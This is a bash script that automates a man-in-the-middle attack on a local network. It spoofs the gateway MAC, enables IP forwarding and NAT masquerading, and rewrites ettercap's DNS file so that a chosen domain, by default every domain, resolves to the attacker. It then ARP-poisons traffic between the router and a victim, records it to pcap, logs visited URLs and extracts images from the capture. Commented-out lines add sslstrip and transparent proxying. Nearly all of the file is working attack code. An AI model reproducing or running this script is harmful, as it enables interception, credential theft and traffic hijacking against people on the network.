#!/bin/bash
SESSION=ETTERCAP_$RANDOM
echo ""
echo "================="
echo "Session: /TMP/$SESSION"
echo "================="
echo ""
function macspoof(){
SPOOFMAC=$(arp -a | awk -v r=$GATEWAY '/r/ { print $4 }')
if [ "$SPOOFMAC" != "" ]; then macchanger --mac $SPOOFMAC $IFACE; fi
}
function ifaceipdetect(){
IFACEIPDETECT=$(ifconfig $IFACE | awk '/inet addr/ { print $2 }' | cut -b 6-20)
if [ "$IFACEIPDETECT" = "" ]; then ifaceup; fi
}
function ifaceup(){
echo "Attempting To Bring Up $IFACE . . .";
ifup $IFACE;
sleep 3
ifaceipdetect
}
read -e -p "AutoMode?: " AUTO
if [ "$AUTO" != "" ]; then
IFACE=eth0
ifaceipdetect
macspoof
IFACEIP=$IFACEIPDETECT
ROUTER=$(route -n | awk '/UG/ { print $2 }')
VICTIM=
DOMAIN=*
XTRACT=
else
read -e -p "What interface [eth0]: " IFACE
if [ "$IFACE" = "" ]; then IFACE=eth0; fi
ifaceipdetect
macspoof
read -e -p "IP OF IFACE [$IFACEIPDETECT]: " IFACEIP
if [ "$IFACEIP" = "" ]; then IFACEIP=$IFACEIPDETECT; fi
GATEWAY=$(route -n | awk '/UG/ { print $2 }')
read -e -p "Gateway IP [$GATEWAY]: " ROUTER
if [ "$ROUTER" = "" ]; then ROUTER=$GATEWAY; fi
read -e -p "Target IP [<blank>]: " VICTIM
read -e -p "DNS Spoof Domain [*]: " DOMAIN
if [ "$DOMAIN" = "" ]; then DOMAIN=*; fi
read -e -p "Extract Images From PCAP [<blank>]: " XTRACT
fi
mkdir /tmp/$SESSION/
#delete all rules
sudo iptables -F
sudo iptables -t nat -F
sudo iptables -t mangle -F
sudo iptables -X

# Enable routing.
iptables -P FORWARD ACCEPT
iptables -A FORWARD -i $IFACE -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward

# Masquerade.
sudo iptables -t nat -A POSTROUTING -j MASQUERADE

echo "$DOMAIN A $IFACEIP" > /usr/share/ettercap/etter.dns
echo "www.$DOMAIN A $IFACEIP" >> /usr/share/ettercap/etter.dns

# Transparent proxying
#iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IFACEIP:80
#iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IFACEIP:443
# sudo iptables -t nat -A PREROUTING -i $IFACE -p tcp --dport 80 -j REDIRECT --to-port 8080

# sslstrip -p -k -w /root/$SESSION/$SESSION.log &
urlsnarf -i $IFACE | grep http > /tmp/$SESSION/$SESSION.txt &
wireshark -i $IFACE -k &
#xterm -e "dnsspoof -f /etc/dnsspoof.conf"
ettercap --quiet -T -i $IFACE -w /tmp/$SESSION/$SESSION.pcap -L /tmp/$SESSION/$SESSION -M arp:remote /$ROUTER/ /$VICTIM/
if [ "$XTRACT" != "" ]; then tcpxtract -f /tmp/$SESSION/$SESSION.pcap; fi
#killall sslstrip
#killall python
killall -9 urlsnarf
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
echo 0 > /proc/sys/net/ipv4/ip_forward
# etterlog -p -i /root/$SESSION/$SESSION.eci
